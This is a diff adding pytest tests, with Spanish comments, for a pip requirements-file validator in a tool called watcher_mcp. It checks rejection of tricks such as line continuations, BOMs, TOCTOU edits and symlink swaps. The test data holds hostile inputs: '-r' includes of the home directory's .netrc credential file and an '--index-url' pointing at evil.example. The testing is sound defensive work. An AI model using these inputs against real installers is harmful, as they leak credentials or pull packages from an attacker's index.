@@ -6,7 +6,13 @@ from pathlib import Path
 
 import pytest
 
-from watcher_mcp.backends.pip import PipBackend, validate_requirements_file
+from watcher_mcp.backends.pip import (
+    PipBackend,
+    normalize_requirements,
+    prune_private_copies,
+    validate_requirements_file,
+    write_private_copy,
+)
 from watcher_mcp.config import Config
 
 
@@ -125,3 +131,113 @@ def test_the_backend_validates_the_file_before_running_pip(config, home):
         backend.validate({"requirements": str(path), "venv": "t", "no_index": True})
     path.write_text("pypdf\n")
     assert backend.validate({"requirements": str(path), "venv": "t", "no_index": True}).requirements == str(path)
+
+
+# --------------------------------------------------------------------------- rodeos del validador (trama 245)
+BYPASSES = {
+    "comentario que acaba en barra": "# nota \\\n-r {home}/.netrc\n",
+    "comentario con sangría": "  # nota \\\n-r {home}/.netrc\n",
+    "comentario y CR suelto": "# nota \\\r-r {home}/.netrc\n",
+    "comentario y salto de página": "# nota \\\x0c-r {home}/.netrc\n",
+    "índice http tras comentario": "  # x \\\n--index-url http://evil.example/simple\n",
+    "con BOM": "\ufeff-r {home}/.netrc\n",
+    "requisito y barra": "pytest \\\n-r {home}/.netrc\n",
+}
+
+
+@pytest.mark.parametrize("body", list(BYPASSES.values()), ids=list(BYPASSES))
+def test_line_continuation_tricks_cannot_hide_a_dangerous_line(config, home, body):
+    with pytest.raises(ValueError):
+        normalize_requirements(write(home, body.format(home=home)), config)
+
+
+def test_comment_lines_do_not_continue_but_requirement_lines_do(config, home):
+    # Como pip: «pkg \» se une a la línea siguiente, «# nota \» no.
+    path = write(home, "pkg \\\n  >=1.0\n# nota \\\nrich\n")
+    assert normalize_requirements(path, config).lines == ["pkg   >=1.0", "rich"]
+
+
+def test_normalized_copy_has_only_validated_lines_and_flattens_includes(config, home):
+    write(home, "pypdf  # comentario\n--index-url https://pypi.example.org/simple\n", "base.txt")
+    write(home, "rich==13.0\n", "constraints.txt")
+    main = write(home, "# cabecera\n-r base.txt\n-c constraints.txt\nrequests>=2 --hash=sha256:" + "ab" * 32 + "\n--pre\n")
+    result = normalize_requirements(main, config)
+    assert result.lines == [
+        "pypdf", "--index-url https://pypi.example.org/simple",
+        "requests>=2 --hash=sha256:" + "ab" * 32, "--pre",
+    ]
+    assert result.constraints == [["rich==13.0"]]
+    copy = write_private_copy(result, home / "privado")
+    text = copy.read_text()
+    # Por líneas: la ruta temporal puede contener «-r» (/tmp/pytest-of-runner/… en los runners de GitHub).
+    lines = text.splitlines()
+    assert "#" not in text and not any(ln.startswith("-r") for ln in lines) and any(ln.startswith("-c ") for ln in lines)
+    assert (copy.parent / "constraints-0.txt").read_text() == "rich==13.0\n"
+    assert oct(copy.stat().st_mode & 0o777) == "0o600" and oct(copy.parent.stat().st_mode & 0o777) == "0o700"
+
+
+def test_bad_hashes_are_rejected(config, home):
+    with pytest.raises(ValueError, match="requisito no válido"):
+        normalize_requirements(write(home, "pkg==1 --hash=md5:zzzz\n"), config)
+
+
+def test_the_requirements_step_reads_the_file_when_it_runs_not_when_it_was_submitted(config, home):
+    """TOCTOU: válido al enviar, cambiado mientras el job esperaba en la cola."""
+    import asyncio
+
+    backend = PipBackend(config)
+    path = write(home, "pypdf\n")
+    spec = backend.validate({"requirements": str(path), "venv": "t", "no_index": True, "installer": "pip"})
+    plan = backend.plan(spec)
+    assert [s.name for s in plan.steps] == ["create-venv", "requirements", "install"]
+    install = plan.steps[-1].argv
+    private = Path(install[install.index("-r") + 1])
+    assert private != path and private.name == "requirements.txt"  # pip nunca recibe la ruta original
+    path.write_text(f"pypdf\n-r {home}/.netrc\n")  # el fichero cambia después de validar
+    logged: list[str] = []
+    from watcher_mcp.backends.base import StepContext
+
+    with pytest.raises(ValueError, match="fuera de las raíces|zona protegida|requirements"):
+        asyncio.run(plan.steps[1].func(StepContext(log=logged.append, cancelled=lambda: False)))
+    assert not private.exists()  # y no se llega a escribir nada que pip pueda leer
+
+
+def test_the_private_copy_is_not_affected_by_later_changes_to_the_original(config, home):
+    import asyncio
+
+    from watcher_mcp.backends.base import StepContext
+
+    backend = PipBackend(config)
+    path = write(home, "pypdf\n")
+    plan = backend.plan(backend.validate({"requirements": str(path), "venv": "t", "no_index": True, "installer": "pip"}))
+    asyncio.run(plan.steps[1].func(StepContext(log=lambda m: None, cancelled=lambda: False)))
+    private = Path(plan.steps[-1].argv[plan.steps[-1].argv.index("-r") + 1])
+    path.write_text(f"-r {home}/.netrc\n")  # tras el paso: pip lee la copia, no esto
+    assert private.read_text() == "pypdf\n"
+
+
+def test_symlink_swapped_in_after_submission_is_still_checked(config, home):
+    import asyncio
+
+    from watcher_mcp.backends.base import StepContext
+
+    backend = PipBackend(config)
+    path = write(home, "pypdf\n")
+    plan = backend.plan(backend.validate({"requirements": str(path), "venv": "t", "no_index": True, "installer": "pip"}))
+    path.unlink()
+    path.symlink_to(home / ".netrc")  # el fichero pasa a ser un enlace a un fichero protegido
+    with pytest.raises(ValueError, match="zona protegida|fuera de las raíces"):
+        asyncio.run(plan.steps[1].func(StepContext(log=lambda m: None, cancelled=lambda: False)))
+
+
+def test_old_private_copies_are_pruned(tmp_path):
+    import os
+    import time
+
+    root = tmp_path / "requirements"
+    (root / "viejo").mkdir(parents=True)
+    (root / "nuevo").mkdir()
+    old = time.time() - 3 * 86400
+    os.utime(root / "viejo", (old, old))
+    prune_private_copies(root)
+    assert not (root / "viejo").exists() and (root / "nuevo").exists()
